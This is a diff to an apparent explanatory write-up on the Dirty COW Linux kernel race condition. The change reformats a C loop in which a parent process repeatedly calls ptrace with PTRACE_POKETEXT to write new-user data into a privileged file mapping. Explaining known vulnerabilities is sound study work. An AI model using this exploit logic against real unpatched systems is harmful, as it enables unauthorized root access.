@@ -47,13 +47,13 @@ As can be seen from dirtycow's attack process, this vulnerability can be exploit
    * The parent process repeatedly calls the ptrace function in the following form:
 
      ```
-     for(i=0;i<10000/l;i++)//l is the byte length of the information formatted by the new user
-     for(j=0;j<l;j++)
-     for(u=0;u<10000;u++)
-     c+=ptrace(PTRACE_POKETEXT,
-                           pid,
-                           map+j,
-                           *((long*)(complete_info + j)));
+     for(i=0;i<10000/l;i++)//l is the byte length of the formatted information for the new user
+         for(j=0;j<l;j++)
+            for(u=0;u<10000;u++)
+               c+=ptrace(PTRACE_POKETEXT,
+                            pid,
+                            map+j,
+                            *((long*)(complete_info + j)));
      ```
 
      The parameter of ptrace is PTRACE_POKETEXT, which means to continuously write the information of *(complete_info + j) to the address (map+j). In such multiple loops, a race condition is created through repeated calls to realize all unauthorized writing of characters.
